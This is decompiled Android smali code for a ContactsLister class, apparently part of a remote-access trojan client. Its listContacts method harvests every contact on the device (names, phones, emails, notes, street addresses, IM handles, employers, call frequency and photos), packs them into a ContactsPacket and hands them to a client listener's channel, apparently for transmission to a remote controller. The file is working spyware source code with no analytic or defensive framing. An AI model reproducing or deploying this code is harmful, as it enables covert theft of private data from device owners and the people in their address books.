.class public Lmy/app/Library/ContactsLister;
.super Ljava/lang/Object;
.source "ContactsLister.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static listContacts(Lmy/app/client/ClientListener;I[B)Z
    .locals 68
    .param p0, "c"    # Lmy/app/client/ClientListener;
    .param p1, "channel"    # I
    .param p2, "args"    # [B

    .prologue
    .line 25
    new-instance v46, Ljava/util/ArrayList;

    invoke-direct/range {v46 .. v46}, Ljava/util/ArrayList;-><init>()V

    .line 27
    .local v46, "l":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lutils/Contact;>;"
    const/16 v60, 0x0

    .line 28
    .local v60, "ret":Z
    new-instance v6, Ljava/lang/String;

    move-object/from16 v0, p2

    invoke-direct {v6, v0}, Ljava/lang/String;-><init>([B)V

    .line 30
    .local v6, "WHERE_CONDITION":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lmy/app/client/ClientListener;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    .line 31
    .local v3, "cr":Landroid/content/ContentResolver;
    sget-object v4, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v5, 0x0

    const/4 v7, 0x0

    const-string v8, " DISPLAY_NAME "

    invoke-virtual/range {v3 .. v8}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v34

    .line 33
    .local v34, "cur":Landroid/database/Cursor;
    invoke-interface/range {v34 .. v34}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-lez v4, :cond_e

    .line 34
    :cond_0
    :goto_0
    invoke-interface/range {v34 .. v34}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_1

    .line 167
    const/16 v60, 0x1

    .line 173
    :goto_1
    new-instance v4, LPacket/ContactsPacket;

    move-object/from16 v0, v46

    invoke-direct {v4, v0}, LPacket/ContactsPacket;-><init>(Ljava/util/ArrayList;)V

    invoke-virtual {v4}, LPacket/ContactsPacket;->build()[B

    move-result-object v4

    move-object/from16 v0, p0

    move/from16 v1, p1

    invoke-virtual {v0, v1, v4}, Lmy/app/client/ClientListener;->handleData(I[B)V

    .line 174
    return v60

    .line 35
    :cond_1
    new-instance v32, Lutils/Contact;

    invoke-direct/range {v32 .. v32}, Lutils/Contact;-><init>()V

    .line 37
    .local v32, "con":Lutils/Contact;
    const-string v4, "_id"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v39

    .line 38
    .local v39, "id":Ljava/lang/String;
    const-string v4, "_id"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v40

    .line 40
    .local v40, "idlong":J
    const-string v4, "times_contacted"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v64

    .line 41
    .local v64, "times_contacted":I
    const-string v4, "last_time_contacted"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v47

    .line 42
    .local v47, "last_time_contacted":J
    const-string v4, "display_name"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v35

    .line 43
    .local v35, "disp_name":Ljava/lang/String;
    const-string v4, "starred"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v61

    .line 45
    .local v61, "starred":I
    move-object/from16 v0, v32

    move-wide/from16 v1, v40

    invoke-virtual {v0, v1, v2}, Lutils/Contact;->setId(J)V

    .line 46
    move-object/from16 v0, v32

    move-wide/from16 v1, v47

    invoke-virtual {v0, v1, v2}, Lutils/Contact;->setLast_time_contacted(J)V

    .line 47
    move-object/from16 v0, v32

    move/from16 v1, v64

    invoke-virtual {v0, v1}, Lutils/Contact;->setTimes_contacted(I)V

    .line 48
    move-object/from16 v0, v32

    move-object/from16 v1, v35

    invoke-virtual {v0, v1}, Lutils/Contact;->setDisplay_name(Ljava/lang/String;)V

    .line 49
    move-object/from16 v0, v32

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lutils/Contact;->setStarred(I)V

    .line 52
    const-string v4, "display_name"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v49

    .line 53
    .local v49, "name":Ljava/lang/String;
    const-string v4, "has_phone_number"

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v34

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    if-lez v4, :cond_0

    .line 56
    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    .line 57
    const-string v10, "contact_id = ?"

    const/4 v4, 0x1

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v12, 0x0

    move-object v7, v3

    .line 56
    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v55

    .line 58
    .local v55, "pCur":Landroid/database/Cursor;
    new-instance v57, Ljava/util/ArrayList;

    invoke-direct/range {v57 .. v57}, Ljava/util/ArrayList;-><init>()V

    .line 59
    .local v57, "phones":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :goto_2
    invoke-interface/range {v55 .. v55}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_b

    .line 63
    invoke-interface/range {v55 .. v55}, Landroid/database/Cursor;->close()V

    .line 64
    move-object/from16 v0, v32

    move-object/from16 v1, v57

    invoke-virtual {v0, v1}, Lutils/Contact;->setPhones(Ljava/util/ArrayList;)V

    .line 67
    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Email;->CONTENT_URI:Landroid/net/Uri;

    .line 68
    const/4 v9, 0x0

    const-string v10, "contact_id = ?"

    .line 69
    const/4 v4, 0x1

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v12, 0x0

    move-object v7, v3

    .line 67
    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v37

    .line 70
    .local v37, "emailCur":Landroid/database/Cursor;
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_2

    .line 71
    new-instance v38, Ljava/util/ArrayList;

    invoke-direct/range {v38 .. v38}, Ljava/util/ArrayList;-><init>()V

    .line 72
    .local v38, "emails":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :goto_3
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_c

    .line 78
    invoke-interface/range {v37 .. v37}, Landroid/database/Cursor;->close()V

    .line 79
    move-object/from16 v0, v32

    move-object/from16 v1, v38

    invoke-virtual {v0, v1}, Lutils/Contact;->setEmails(Ljava/util/ArrayList;)V

    .line 83
    .end local v38    # "emails":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_2
    const-string v10, "contact_id = ? AND mimetype = ?"

    .line 84
    .local v10, "noteWhere":Ljava/lang/String;
    const/4 v4, 0x2

    new-array v11, v4, [Ljava/lang/String;

    const/4 v4, 0x0

    aput-object v39, v11, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/note"

    aput-object v5, v11, v4

    .line 85
    .local v11, "noteWhereParams":[Ljava/lang/String;
    sget-object v8, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    const/4 v12, 0x0

    move-object v7, v3

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v51

    .line 86
    .local v51, "noteCur":Landroid/database/Cursor;
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_4

    .line 87
    new-instance v52, Ljava/util/ArrayList;

    invoke-direct/range {v52 .. v52}, Ljava/util/ArrayList;-><init>()V

    .line 88
    .local v52, "notes":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_3

    .line 89
    const-string v4, "data1"

    move-object/from16 v0, v51

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v51

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v50

    .line 90
    .local v50, "note":Ljava/lang/String;
    move-object/from16 v0, v52

    move-object/from16 v1, v50

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 92
    .end local v50    # "note":Ljava/lang/String;
    :cond_3
    invoke-interface/range {v51 .. v51}, Landroid/database/Cursor;->close()V

    .line 93
    move-object/from16 v0, v32

    move-object/from16 v1, v52

    invoke-virtual {v0, v1}, Lutils/Contact;->setNotes(Ljava/util/ArrayList;)V

    .line 98
    .end local v52    # "notes":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_4
    const-string v15, "contact_id = ? AND mimetype = ?"

    .line 99
    .local v15, "addrWhere":Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v16, v0

    const/4 v4, 0x0

    aput-object v39, v16, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/postal-address_v2"

    aput-object v5, v16, v4

    .line 100
    .local v16, "addrWhereParams":[Ljava/lang/String;
    sget-object v13, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/4 v14, 0x0

    const/16 v17, 0x0

    move-object v12, v3

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v28

    .line 102
    .local v28, "addrCur":Landroid/database/Cursor;
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_5

    .line 103
    :goto_4
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_d

    .line 118
    invoke-interface/range {v28 .. v28}, Landroid/database/Cursor;->close()V

    .line 122
    :cond_5
    const-string v20, "contact_id = ? AND mimetype = ?"

    .line 123
    .local v20, "imWhere":Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v21, v0

    const/4 v4, 0x0

    aput-object v39, v21, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/im"

    aput-object v5, v21, v4

    .line 124
    .local v21, "imWhereParams":[Ljava/lang/String;
    sget-object v18, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v19, 0x0

    const/16 v22, 0x0

    move-object/from16 v17, v3

    invoke-virtual/range {v17 .. v22}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v42

    .line 125
    .local v42, "imCur":Landroid/database/Cursor;
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_7

    .line 126
    new-instance v44, Ljava/util/ArrayList;

    invoke-direct/range {v44 .. v44}, Ljava/util/ArrayList;-><init>()V

    .line 127
    .local v44, "ims":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_6

    .line 128
    const-string v4, "data1"

    move-object/from16 v0, v42

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v42

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v43

    .line 130
    .local v43, "imName":Ljava/lang/String;
    move-object/from16 v0, v44

    move-object/from16 v1, v43

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 132
    .end local v43    # "imName":Ljava/lang/String;
    :cond_6
    invoke-interface/range {v42 .. v42}, Landroid/database/Cursor;->close()V

    .line 133
    move-object/from16 v0, v32

    move-object/from16 v1, v44

    invoke-virtual {v0, v1}, Lutils/Contact;->setMessaging(Ljava/util/ArrayList;)V

    .line 137
    .end local v44    # "ims":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_7
    const-string v25, "contact_id = ? AND mimetype = ?"

    .line 138
    .local v25, "orgWhere":Ljava/lang/String;
    const/4 v4, 0x2

    new-array v0, v4, [Ljava/lang/String;

    move-object/from16 v26, v0

    const/4 v4, 0x0

    aput-object v39, v26, v4

    const/4 v4, 0x1

    const-string v5, "vnd.android.cursor.item/organization"

    aput-object v5, v26, v4

    .line 139
    .local v26, "orgWhereParams":[Ljava/lang/String;
    sget-object v23, Landroid/provider/ContactsContract$Data;->CONTENT_URI:Landroid/net/Uri;

    const/16 v24, 0x0

    const/16 v27, 0x0

    move-object/from16 v22, v3

    invoke-virtual/range {v22 .. v27}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v53

    .line 140
    .local v53, "orgCur":Landroid/database/Cursor;
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->getCount()I

    move-result v4

    if-eqz v4, :cond_9

    .line 141
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v4

    if-eqz v4, :cond_8

    .line 142
    const-string v4, "data1"

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v54

    .line 143
    .local v54, "orgName":Ljava/lang/String;
    const-string v4, "data4"

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v53

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v65

    .line 145
    .local v65, "title":Ljava/lang/String;
    move-object/from16 v0, v32

    move-object/from16 v1, v54

    invoke-virtual {v0, v1}, Lutils/Contact;->setOrganisationName(Ljava/lang/String;)V

    .line 146
    move-object/from16 v0, v32

    move-object/from16 v1, v65

    invoke-virtual {v0, v1}, Lutils/Contact;->setOrganisationStatus(Ljava/lang/String;)V

    .line 148
    .end local v54    # "orgName":Ljava/lang/String;
    .end local v65    # "title":Ljava/lang/String;
    :cond_8
    invoke-interface/range {v53 .. v53}, Landroid/database/Cursor;->close()V

    .line 152
    :cond_9
    sget-object v4, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-wide/from16 v0, v40

    invoke-static {v4, v0, v1}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v67

    .line 153
    .local v67, "uri":Landroid/net/Uri;
    move-object/from16 v0, v67

    invoke-static {v3, v0}, Landroid/provider/ContactsContract$Contacts;->openContactPhotoInputStream(Landroid/content/ContentResolver;Landroid/net/Uri;)Ljava/io/InputStream;

    move-result-object v45

    .line 154
    .local v45, "input":Ljava/io/InputStream;
    if-eqz v45, :cond_a

    .line 155
    invoke-static/range {v45 .. v45}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;

    move-result-object v58

    .line 157
    .local v58, "pic":Landroid/graphics/Bitmap;
    new-instance v30, Ljava/io/ByteArrayOutputStream;

    invoke-direct/range {v30 .. v30}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 158
    .local v30, "bos":Ljava/io/ByteArrayOutputStream;
    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/4 v5, 0x0

    move-object/from16 v0, v58

    move-object/from16 v1, v30

    invoke-virtual {v0, v4, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 159
    invoke-virtual/range {v30 .. v30}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v29

    .line 160
    .local v29, "bitmapdata":[B
    move-object/from16 v0, v32

    move-object/from16 v1, v29

    invoke-virtual {v0, v1}, Lutils/Contact;->setPhoto([B)V

    .line 163
    .end local v29    # "bitmapdata":[B
    .end local v30    # "bos":Ljava/io/ByteArrayOutputStream;
    .end local v58    # "pic":Landroid/graphics/Bitmap;
    :cond_a
    move-object/from16 v0, v46

    move-object/from16 v1, v32

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_0

    .line 60
    .end local v10    # "noteWhere":Ljava/lang/String;
    .end local v11    # "noteWhereParams":[Ljava/lang/String;
    .end local v15    # "addrWhere":Ljava/lang/String;
    .end local v16    # "addrWhereParams":[Ljava/lang/String;
    .end local v20    # "imWhere":Ljava/lang/String;
    .end local v21    # "imWhereParams":[Ljava/lang/String;
    .end local v25    # "orgWhere":Ljava/lang/String;
    .end local v26    # "orgWhereParams":[Ljava/lang/String;
    .end local v28    # "addrCur":Landroid/database/Cursor;
    .end local v37    # "emailCur":Landroid/database/Cursor;
    .end local v42    # "imCur":Landroid/database/Cursor;
    .end local v45    # "input":Ljava/io/InputStream;
    .end local v51    # "noteCur":Landroid/database/Cursor;
    .end local v53    # "orgCur":Landroid/database/Cursor;
    .end local v67    # "uri":Landroid/net/Uri;
    :cond_b
    const-string v4, "data1"

    move-object/from16 v0, v55

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v55

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v56

    .line 61
    .local v56, "phone":Ljava/lang/String;
    move-object/from16 v0, v57

    move-object/from16 v1, v56

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_2

    .line 74
    .end local v56    # "phone":Ljava/lang/String;
    .restart local v37    # "emailCur":Landroid/database/Cursor;
    .restart local v38    # "emails":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :cond_c
    const-string v4, "data1"

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v37

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v36

    .line 76
    .local v36, "email":Ljava/lang/String;
    move-object/from16 v0, v38

    move-object/from16 v1, v36

    invoke-virtual {v0, v1}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto/16 :goto_3

    .line 104
    .end local v36    # "email":Ljava/lang/String;
    .end local v38    # "emails":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .restart local v10    # "noteWhere":Ljava/lang/String;
    .restart local v11    # "noteWhereParams":[Ljava/lang/String;
    .restart local v15    # "addrWhere":Ljava/lang/String;
    .restart local v16    # "addrWhereParams":[Ljava/lang/String;
    .restart local v28    # "addrCur":Landroid/database/Cursor;
    .restart local v51    # "noteCur":Landroid/database/Cursor;
    :cond_d
    const-string v4, "data4"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v63

    .line 105
    .local v63, "street":Ljava/lang/String;
    const-string v4, "data7"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v31

    .line 106
    .local v31, "city":Ljava/lang/String;
    const-string v4, "data8"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v62

    .line 107
    .local v62, "state":Ljava/lang/String;
    const-string v4, "data9"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v59

    .line 108
    .local v59, "postalCode":Ljava/lang/String;
    const-string v4, "data10"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v33

    .line 109
    .local v33, "country":Ljava/lang/String;
    const-string v4, "data2"

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v28

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v66

    .line 111
    .local v66, "type":I
    move-object/from16 v0, v32

    move-object/from16 v1, v63

    invoke-virtual {v0, v1}, Lutils/Contact;->setStreet(Ljava/lang/String;)V

    .line 112
    move-object/from16 v0, v32

    move-object/from16 v1, v31

    invoke-virtual {v0, v1}, Lutils/Contact;->setCity(Ljava/lang/String;)V

    .line 113
    move-object/from16 v0, v32

    move-object/from16 v1, v62

    invoke-virtual {v0, v1}, Lutils/Contact;->setRegion(Ljava/lang/String;)V

    .line 114
    move-object/from16 v0, v32

    move-object/from16 v1, v59

    invoke-virtual {v0, v1}, Lutils/Contact;->setPostalcode(Ljava/lang/String;)V

    .line 115
    invoke-virtual/range {v32 .. v33}, Lutils/Contact;->setCountry(Ljava/lang/String;)V

    .line 116
    move-object/from16 v0, v32

    move/from16 v1, v66

    invoke-virtual {v0, v1}, Lutils/Contact;->setType_addr(I)V

    goto/16 :goto_4

    .line 170
    .end local v10    # "noteWhere":Ljava/lang/String;
    .end local v11    # "noteWhereParams":[Ljava/lang/String;
    .end local v15    # "addrWhere":Ljava/lang/String;
    .end local v16    # "addrWhereParams":[Ljava/lang/String;
    .end local v28    # "addrCur":Landroid/database/Cursor;
    .end local v31    # "city":Ljava/lang/String;
    .end local v32    # "con":Lutils/Contact;
    .end local v33    # "country":Ljava/lang/String;
    .end local v35    # "disp_name":Ljava/lang/String;
    .end local v37    # "emailCur":Landroid/database/Cursor;
    .end local v39    # "id":Ljava/lang/String;
    .end local v40    # "idlong":J
    .end local v47    # "last_time_contacted":J
    .end local v49    # "name":Ljava/lang/String;
    .end local v51    # "noteCur":Landroid/database/Cursor;
    .end local v55    # "pCur":Landroid/database/Cursor;
    .end local v57    # "phones":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v59    # "postalCode":Ljava/lang/String;
    .end local v61    # "starred":I
    .end local v62    # "state":Ljava/lang/String;
    .end local v63    # "street":Ljava/lang/String;
    .end local v64    # "times_contacted":I
    .end local v66    # "type":I
    :cond_e
    const/16 v60, 0x0

    goto/16 :goto_1
.end method
